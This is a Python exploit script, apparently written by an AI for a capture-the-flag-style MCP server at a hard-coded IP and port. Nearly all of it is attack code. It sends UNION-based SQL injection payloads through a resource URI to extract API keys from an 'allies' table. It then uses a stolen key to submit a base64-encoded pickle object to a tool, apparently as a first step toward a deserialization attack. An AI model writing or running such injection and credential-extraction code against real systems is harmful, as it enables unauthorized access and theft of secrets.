#!/usr/bin/env python3
"""
Get API Key - Final Attempt
Author: Claude
Purpose: Extract a valid API key using correct column count
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Get working API key
Produced Result: TBD
"""

import requests
import json
import base64
import pickle

MCP_URL = "http://154.57.164.74:31735/mcp/"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "final", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Extracting API Key")
print("="*60)

# The ally/status endpoint returns 3 columns
# Try to extract API key from allies table
print("\n[*] Testing 3-column extractions...")

queries = [
    ("api_key, id, id", "api_key/id/id"),
    ("id, api_key, id", "id/api_key/id"),
    ("id, id, api_key", "id/id/api_key"),
]

for cols, desc in queries:
    sqli = f"a' UNION SELECT {cols} FROM allies LIMIT 1--"
    result = client.read_resource(f"ash-data://ally/status/{sqli}")

    if "result" in result and "contents" in result["result"]:
        print(f"\n✓ {desc} - SUCCESS!")
        print(json.dumps(result, indent=2))

        # Extract the API key from the response
        text = result["result"]["contents"][0]["text"]
        print(f"\nRaw text: {text}")

        # Try to find a 64-character hex string
        import re
        matches = re.findall(r'[a-f0-9]{64}', text)
        if matches:
            print(f"\nFound API key: {matches[0]}")

            # Test it
            print("\n[*] Testing extracted API key...")
            filter_obj = {"test": "data"}
            pickled = pickle.dumps(filter_obj)
            encoded = base64.b64encode(pickled).decode('ascii')

            test_result = client.send_request("tools/call", {
                "name": "submit_convergence_filter",
                "arguments": {
                    "ally_api_key": matches[0],
                    "filter_object": encoded
                }
            })

            print(f"Test result: {json.dumps(test_result, indent=2)}")
        break
    elif "error" in result:
        print(f"✗ {desc} - {result['error']['message'][:100]}")
